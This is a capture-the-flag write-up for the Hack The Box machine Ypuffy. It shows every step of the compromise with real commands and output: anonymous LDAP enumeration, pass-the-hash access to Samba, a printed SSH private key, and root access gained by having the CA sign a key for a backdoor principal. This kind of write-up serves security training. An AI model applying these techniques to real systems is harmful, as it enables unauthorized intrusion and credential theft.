---
layout: single
title: Ypuffy - Hack The Box
excerpt: This is the writeup for Ypuffy, an OpenBSD machine from Hack the Box involving a somewhat easy shell access followed by a privesc using CA signed SSH keys.
date: 2019-02-09
classes: wide
header:
  teaser: /assets/images/htb-writeup-ypuffy/ypuffy_logo.png
categories:
  - hackthebox
  - infosec
tags:
  - openbsd
  - ssh
  - pass-the-hash
  - ldap
  - ca 
---

Ypuffy is being retired this weekend, so it's time to do another writeup. I think this is the only OpenBSD machine so far on Hack the Box. The initial user part was not really difficult and involved doing some basic LDAP edumeration to find an NTLM hash that can be used to access a Samba share and recover an SSH private key. The priv esc used CA signed SSH keys which is something I've never personally used before.

![](/assets/images/htb-writeup-ypuffy/ypuffy_logo.png)

## Quick summary

- The LDAP server allows anyone to connect and enumerate the contents
- An NT hash is found in the LDAP directory for user `alice1978`
- We can pass the hash to get access to the SMB share and download the SSH private key
- User `alice1978` can run `ssh-keygen` as user `userca` and sign a new DSA SSH key with a principal name associated with the root user

### Tools/Blogs used

- [https://code.fb.com/security/scalable-and-secure-access-with-ssh/](https://code.fb.com/security/scalable-and-secure-access-with-ssh/)

## Detailed steps

### Portscan

I started with the typical nmap scan and found a couple of interesting ports in addition to the SSH and webserver: LDAP is running on this box and there is also Samba running.

```
root@ragingunicorn:~# nmap -sC -sV -p- 10.10.10.107
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-08 01:37 EST
Nmap scan report for 10.10.10.107
Host is up (0.015s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 2e:19:e6:af:1b:a7:b0:e8:07:2a:2b:11:5d:7b:c6:04 (RSA)
|   256 dd:0f:6a:2a:53:ee:19:50:d9:e5:e7:81:04:8d:91:b6 (ECDSA)
|_  256 21:9e:db:bd:e1:78:4d:72:b0:ea:b4:97:fb:7f:af:91 (ED25519)
80/tcp  open  http        OpenBSD httpd
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YPUFFY)
389/tcp open  ldap        (Anonymous bind OK)
445/tcp open  netbios-ssn Samba smbd 4.7.6 (workgroup: YPUFFY)
Service Info: Host: YPUFFY

Host script results:
|_clock-skew: mean: -3h28m23s, deviation: 2h53m12s, median: -5h08m23s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6)
|   Computer name: ypuffy
|   NetBIOS computer name: YPUFFY\x00
|   Domain name: hackthebox.htb
|   FQDN: ypuffy.hackthebox.htb
|_  System time: 2019-02-07T20:29:50-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-02-07 20:29:50
|_  start_date: N/A
```

### Web server enumeration

The server doesn't respond with anything when we connect to it:

```
root@ragingunicorn:~# curl 10.10.10.107
curl: (52) Empty reply from server
```

We'll come back to this later when we get user access to the box.

### SMB share enumeration

I got an access denied when trying to check the shares. We'll need the credentials to enumerate this further. More on this later on.

```
root@ragingunicorn:~# smbmap -H 10.10.10.107
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.10.107...
[+] IP: 10.10.10.107:445	Name: 10.10.10.107                                      
	Disk                                                  	Permissions
	----                                                  	-----------
[!] Access Denied
```

### LDAP enumeration

To enumerate the LDAP, we need to give it the base dn to for the search. When I checked the output from nmap I saw the `ypuffy.hackthebox.htb` FQDN from the SMB discovery script. So I tried `hackthebox.htb` as domain to search from, luckily the box doesn't require authentication to pull data from it.

The most interesting entry is this one for `alice1978` because it contains an NTLM hash. The `userPassword` field is not useful, it just contains `{BSDAUTH}alice1978` in base64 encoded format.

```
root@ragingunicorn:~# ldapsearch -h 10.10.10.107 -x -b "dc=hackthebox,dc=htb"
[...]
# alice1978, passwd, hackthebox.htb
dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb
uid: alice1978
cn: Alice
objectClass: account
objectClass: posixAccount
objectClass: top
objectClass: sambaSamAccount
userPassword:: e0JTREFVVEh9YWxpY2UxOTc4
uidNumber: 5000
gidNumber: 5000
gecos: Alice
homeDirectory: /home/alice1978
loginShell: /bin/ksh
sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001
displayName: Alice
sambaAcctFlags: [U          ]
sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000
sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B
sambaPwdLastSet: 1532916644
[...]
```

### Passing the hash

The first thing I did was look up the NT hash online to see if I could quickly get the password but I didn't find any match for this one. It probably uses a strong password which I won't waste time cracking.

![](/assets/images/htb-writeup-ypuffy/ntlm.png)

We don't have the password but we can pass the hash to the Samba server and list the shares:

```
root@ragingunicorn:~# smbmap -u alice1978 -p '00000000000000000000000000000000:0B186E661BBDBDCF6047784DE8B9FD8B' -d hackthebox.htb -H 10.10.10.107
[+] Finding open SMB ports....
[+] Hash detected, using pass-the-hash to authentiate
[+] User session establishd on 10.10.10.107...
[+] IP: 10.10.10.107:445	Name: 10.10.10.107                                      
	Disk                                                  	Permissions
	----                                                  	-----------
	alice                                             	READ, WRITE
	IPC$                                              	NO ACCESS
```

Cool, we can access the `alice` share. Next I listed all the files in the share:

```
root@ragingunicorn:~# smbmap -u alice1978 -p '00000000000000000000000000000000:0B186E661BBDBDCF6047784DE8B9FD8B' -s alice -R -H 10.10.10.107
[+] Finding open SMB ports....
[+] Hash detected, using pass-the-hash to authentiate
[+] User session establishd on 10.10.10.107...
[+] IP: 10.10.10.107:445	Name: 10.10.10.107                                      
	Disk                                                  	Permissions
	----                                                  	-----------
	alice                                             	READ, WRITE
	.\
	dr--r--r--                0 Thu Feb  7 20:48:09 2019	.
	dr--r--r--                0 Tue Jul 31 23:16:50 2018	..
	-r--r--r--             1460 Mon Jul 16 21:38:51 2018	my_private_key.ppk
	IPC$                                              	NO ACCESS
```

That SSH private key looks interesting, let's download it and confirm this is really an SSH key:

```
root@ragingunicorn:~# smbmap -u alice1978 -p '00000000000000000000000000000000:0B186E661BBDBDCF6047784DE8B9FD8B' --download alice/my_private_key.ppk -H 10.10.10.107
[+] Finding open SMB ports....
[+] Hash detected, using pass-the-hash to authentiate
[+] User session establishd on 10.10.10.107...
[+] Starting download: alice\my_private_key.ppk (1460 bytes)
[+] File output to: /usr/share/smbmap/10.10.10.107-alice_my_private_key.ppk
root@ragingunicorn:~# file /usr/share/smbmap/10.10.10.107-alice_my_private_key.ppk
/usr/share/smbmap/10.10.10.107-alice_my_private_key.ppk: ASCII text, with CRLF line terminators
root@ragingunicorn:~# cat /usr/share/smbmap/10.10.10.107-alice_my_private_key.ppk
PuTTY-User-Key-File-2: ssh-rsa
Encryption: none
Comment: rsa-key-20180716
Public-Lines: 6
AAAAB3NzaC1yc2EAAAABJQAAAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz
1am2V3wNRkKR+gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02qux
BoLMq0VSFK5A0Ep5Hm8WZxy5wteK3RDx0HKO/aCvsaYPJa2zvxdtp1JGPbN5zBAj
h7U8op4/lIskHqr7DHtYeFpjZOM9duqlVxV7XchzW9XZe/7xTRrbthCvNcSC/Sxa
iA2jBW6n3dMsqpB8kq+b7RVnVXGbBK5p4n44JD2yJZgeDk+1JClS7ZUlbI5+6KWx
ivAMf2AqY5e1adjpOfo6TwmB0Cyx0rIYMvsog3HnqyHcVR/Ufw==
Private-Lines: 14
AAABAH0knH2xprkuycHoh18sGrlvVGVG6C2vZ9PsiBdP/5wmhpYI3Svnn3ZL8CwF
VGaXdidhZunC9xmD1/QAgCgTz/Fh5yl+nGdeBWc10hLD2SeqFJoHU6SLYpOSViSE
cOZ5mYSy4IIRgPdJKwL6NPnrO+qORSSs9uKVqEdmKLm5lat9dRJVtFlG2tZ7tsma
hRM//9du5MKWWemJlW9PmRGY6shATM3Ow8LojNgnpoHNigB6b/kdDozx6RIf8b1q
Gs+gaU1W5FVehiV6dO2OjHUoUtBME01owBLvwjdV/1Sea/kcZa72TYIMoN1MUEFC
3hlBVcWbiy+O27JzmDzhYen0Jq0AAACBANTBwU1DttMKKphHAN23+tvIAh3rlNG6
m+xeStOxEusrbNL89aEU03FWXIocoQlPiQBr3s8OkgMk1QVYABlH30Y2ZsPL/hp6
l4UVEuHUqnTfEOowVTcVNlwpNM8YLhgn+JIeGpJZqus5JK/pBhK0JclenIpH5M2v
4L9aKFwiMZxfAAAAgQDG+o9xrh+rZuQg8BZ6ZcGGdszZITn797a4YU+NzxjP4jR+
qSVCTRky9uSP0i9H7B9KVnuu9AfzKDBgSH/zxFnJqBTTykM1imjt+y1wVa/3aLPh
hKxePlIrP3YaMKd38ss2ebeqWy+XJYwgWOsSw8wAQT7fIxmT8OYfJRjRGTS74QAA
AIEAiOHSABguzA8sMxaHMvWu16F0RKXLOy+S3ZbMrQZr+nDyzHYPaLDRtNE2iI5c
QLr38t6CRO6zEZ+08Zh5rbqLJ1n8i/q0Pv+nYoYlocxw3qodwUlUYcr1/sE+Wuvl
xTwgKNIb9U6L6OdSr5FGkFBCFldtZ/WSHtbHxBabb0zpdts=
Private-MAC: 208b4e256cd56d59f70e3594f4e2c3ca91a757c9
```

To convert it to the OpenSSH format, I used the `puttygen` utility:

```
root@ragingunicorn:~# puttygen /usr/share/smbmap/10.10.10.107-alice_my_private_key.ppk -O private-openssh -o alice_rsa
root@ragingunicorn:~# file alice_rsa
alice_rsa: PEM RSA private key
```

We can log in and get the user flag at this point:

```
root@ragingunicorn:~# ssh -i alice_rsa alice1978@10.10.10.107
The authenticity of host '10.10.10.107 (10.10.10.107)' can't be established.
ECDSA key fingerprint is SHA256:oYYpshmLOvkyebJUObgH6bxJkOGRu7xsw3r7ta0LCzE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.107' (ECDSA) to the list of known hosts.
OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

ypuffy$ cat user.txt
acbc06<redacted>
```

### Priv esc

The home directory contains an interesting user `userca`:

```
ypuffy$ ls -la
total 20
drwxr-xr-x   5 root       wheel      512 Jul 30  2018 .
drwxr-xr-x  13 root       wheel      512 Feb  5 00:30 ..
drwxr-x---   3 alice1978  alice1978  512 Jul 31  2018 alice1978
drwxr-xr-x   3 bob8791    bob8791    512 Jul 30  2018 bob8791
drwxr-xr-x   3 userca     userca     512 Jul 30  2018 userca
```

Bob8791's home directory contains an SQL file with a reference to a `principal` and `keys` tables:

```
ypuffy$ pwd
/home/bob8791/dba
ypuffy$ ls
sshauth.sql
ypuffy$ cat sshauth.sql                                                                                                                                                                                           
CREATE TABLE principals (
        uid text,
        client cidr,
        principal text,
        PRIMARY KEY (uid,client,principal)
);

CREATE TABLE keys (
        uid text,
        key text,
        PRIMARY KEY (uid,key)
);
grant select on principals,keys to appsrv;
```

The `userca` directory contains the CA private and public keys:

```
ypuffy$ ls -la
-r--------  1 userca  userca  1679 Jul 30  2018 ca
-r--r--r--  1 userca  userca   410 Jul 30  2018 ca.pub
ypuffy$ file ca.pub
ca.pub: OpenSSH RSA public key
```

The `httpd.conf` file contains some directories that I didn't enumerate at the beginning of the box:

```
ypuffy$ cat httpd.conf                                                                                                                                                                                            
server "ypuffy.hackthebox.htb" {
        listen on * port 80

        location "/userca*" {
                root "/userca"
                root strip 1
                directory auto index
        }

        location "/sshauth*" {
                fastcgi socket "/run/wsgi/sshauthd.socket"
        }

        location * {
                block drop
        }
}
```

The `/etc/ssh/sshd_config` file has been modified by the box creator and contains a few interesting lines:

```
AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&username=%u
AuthorizedKeysCommandUser nobody

TrustedUserCAKeys /home/userca/ca.pub
AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&username=%u
AuthorizedPrincipalsCommandUser nobody
```

Here's the summary of the what we found: SSH has been configured on this box to look up the public key of the connecting users by interrogating some kind of web application running on the box. The `AuthorizedKeysCommand` is useful when you don't want to have to upload public keys on a whole bunch of server. You can centralize the keys in a database somewhere so it's much easier to manage. The database dump we saw earlier in bob's directory confirms this. The second `AuthorizedPrincipalsCommand` configuration is used to look up allowed principals in the database. The principal is added when the keys are signed by the CA.

We can read the public SSH keys by sending requests to the application. The GET parameters are the same as what was in the database file:

```
ypuffy$ curl "http://127.0.0.1/sshauth?type=keys&username=alice1978"
ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz1am2V3wNRkKR+gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02quxBoLMq0VSFK5A0Ep5Hm8WZxy5wteK3RDx0HKO/aCvsaYPJa2zvxdtp1JGPbN5zBAjh7U8op4/lIskHqr7DHtYeFpjZOM9duqlVxV7XchzW9XZe/7xTRrbthCvNcSC/SxaiA2jBW6n3dMsqpB8kq+b7RVnVXGbBK5p4n44JD2yJZgeDk+1JClS7ZUlbI5+6KWxivAMf2AqY5e1adjpOfo6TwmB0Cyx0rIYMvsog3HnqyHcVR/Ufw== rsa-key-20180716
ypuffy$ curl "http://127.0.0.1/sshauth?type=keys&username=bob8791"   
ypuffy$ curl "http://127.0.0.1/sshauth?type=keys&username=userca"  
ypuffy$ curl "http://127.0.0.1/sshauth?type=keys&username=root"   
```

We can only get the public key for user `alice1978`

Next, we can list the principal names using:

```
ypuffy$ curl "http://127.0.0.1/sshauth?type=principals&username=alice1978"
alice1978
ypuffy$ curl "http://127.0.0.1/sshauth?type=principals&username=bob8791"   
bob8791
ypuffy$ curl "http://127.0.0.1/sshauth?type=principals&username=userca"  
ypuffy$ curl "http://127.0.0.1/sshauth?type=principals&username=appsrv" 
ypuffy$ curl "http://127.0.0.1/sshauth?type=principals&username=root"   
3m3rgencyB4ckd00r
```

Interesting, there's a principal name for root called `3m3rgencyB4ckd00r`. If we could have the CA sign an SSH key with this principal name, we should be able to log in as `root` on the box.

OpenBSD has a `sudo` equivalent called `doas`:

```
ypuffy$ cat /etc/doas.conf                                                                                                                                                              
permit keepenv :wheel
permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen
```

It seems we can run `ssh-keygen` as user `userca` without entering a password.

```
ypuffy$ ssh-keygen -t ecdsa 
Generating public/private ecdsa key pair.
Enter file in which to save the key (/home/alice1978/.ssh/id_ecdsa): /tmp/id_ecdsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /tmp/id_ecdsa.
Your public key has been saved in /tmp/id_ecdsa.pub.
The key fingerprint is:
SHA256:kbrMU2l1XcB9DEIKw58lsyYFz03VMLDuEPgQrXQWW3c alice1978@ypuffy.hackthebox.htb
The key's randomart image is:
+---[ECDSA 256]---+
|       .=o.o*+BBE|
|        oOB*.=.+=|
|       .=*B*+ . .|
|       .o*=+     |
|      . Soo .    |
|     o +   o     |
|      =     .    |
|       .         |
|                 |
+----[SHA256]-----+
```

We can generate a new DSA keypair for Alice and get it sign by the CA, making sure to assign the root's principal name `3m3rgencyB4ckd00r`"

Here's the breakdown of the `ssh-keygen` parameters used:
 - `-s` : this is the private key that will be used to sign the keys
 - `-I` : that's the certificate identity
 - `-n` : the principals associated with the key (we need to include `3m3rgencyB4ckd00r`)
 - `-V` : validity of the key
 - `-z` : serial number
 - `id_ecdsa.pub` : The public key we previously generated

```
ypuffy$ doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I snowscan -n root,3m3rgencyB4ckd00r -V +1w -z 1 id_ecdsa.pub
Signed user key id_ecdsa-cert.pub: id "snowscan" serial 1 for root,3m3rgencyB4ckd00r valid from 2018-09-15T20:07:00 to 2018-09-22T20:08:02
ypuffy$ mkdir /home/alice1978/.ssh
ypuffy$ cp id_ecdsa* /home/alice1978/.ssh 
ypuffy$ ssh root@localhost
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:oYYpshmLOvkyebJUObgH6bxJkOGRu7xsw3r7ta0LCzE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'localhost' (ECDSA) to the list of known hosts.
OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

ypuffy# cat root.txt                                                                                                                                                                    
1265f8<redacted>
```